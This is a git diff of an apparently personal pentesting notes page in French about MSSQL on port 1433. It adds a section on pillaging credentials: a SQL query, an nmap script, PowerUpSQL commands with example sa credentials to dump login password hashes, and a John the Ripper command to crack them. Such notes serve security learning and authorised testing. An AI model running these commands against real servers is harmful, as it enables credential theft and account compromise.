@@ -1,6 +1,5 @@
 ---
-public: true 
-#Tags: vhost, hashes, lfi, password-spraying, potato
+public: true
 ---
 
 Port : 1433
@@ -251,10 +250,39 @@ There are other methods to get command execution, such as adding [extended stor
 
 ## Pillage : collecte de hash
 
-Les hash des comptes utilisateurs s
+### Client MSSql
+Les hash des comptes utilisateurs peuvent être extraits via :
+
+```sql
+select name,password_hash from sys.sql_logins ;
+```
+
+### Nmap
+
+```shell
+nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146
+```
+
+### PowerUpSQL
+
+```powershell
+Import-Module .\PowerUpSQL.ps1
+Get-SQLServerPasswordHash -username sa -Password Password@1 -instance WIN-P83OS778EQK\SQLEXPRESS -Verbose
+```
+
+#### Cassage des hash
+
+```shell
+john --format=mssql12 --wordlist=pass hash
+
+```
 
 
-
-## Voir aussii
+## Voir aussi
 
 <https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet>
+
+
+## Références
+
+- https://www.hackingarticles.in/mssql-for-pentester-hashing/
